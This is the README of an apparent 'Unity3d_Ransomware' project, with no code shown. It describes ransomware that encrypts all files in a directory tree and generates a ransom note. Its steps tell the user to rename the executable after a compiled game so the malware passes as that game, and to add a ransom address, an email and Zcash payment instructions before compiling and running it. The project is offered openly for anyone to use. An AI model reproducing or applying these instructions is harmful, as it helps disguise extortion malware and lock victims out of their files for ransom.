# Unity3d_Ransomware


# Ransomware - Encrypt and Decrypt Files

## Overview
This program can be used to encrypt and decrypt files with ransomware.

## Features

* Uses a symmetric key algorithm to encrypt and decrypt files
* Encrypts all files in a directory and its subdirectories, excluding the executable file
* Generates a ransom note to prompt for a ransom payment
* Allows for decryption of files with the input of correct decryption key

## Instructions
(change the name of the .exe file to suit the name of your compiled game name.. ex:   My_Game.exe)
1. Download or clone the repository to your system.
2. Add your ransom address, email, and Zcash payment receipt instructions in the `GenerateRansomNotes()` method in the `Ransomware.cs` file.
3. Compile and run the program.
4. Use the `EncryptFiles()` method to encrypt files in a directory.
5. Use the `DecryptFiles()` method to decrypt files with the right decryption key.

## Requirements

* .NET framework 2.0 or higher

## License

This project is open source and available under the [MIT License](https://github.com/LICENSE). Feel free to modify, use or share the code.
